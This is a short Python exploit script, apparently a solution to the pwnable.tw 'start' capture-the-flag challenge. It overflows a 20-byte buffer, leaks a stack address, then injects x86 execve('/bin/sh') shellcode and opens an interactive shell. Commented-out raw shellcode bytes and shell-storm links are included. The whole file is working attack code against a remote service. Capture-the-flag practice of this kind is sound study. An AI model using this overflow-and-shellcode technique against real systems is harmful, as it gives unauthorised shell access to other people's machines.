from pwn import *

p = remote('chall.pwnable.tw', 10000)
print(p.read())

payload = b"A"*20
payload += p32(0x08048087)
p.send(payload)

esp = unpack(p.read()[:4])
info("Leaked Address: " + hex(esp))

shellcode = asm(
    """
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
    """
)

# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
# https://shell-storm.org/shellcode/files/shellcode-752.html
# https://shell-storm.org/shellcode/files/shellcode-575.html

payload = b"A"*20
payload += p32(esp+20)
payload += shellcode

p.send(payload)
p.interactive()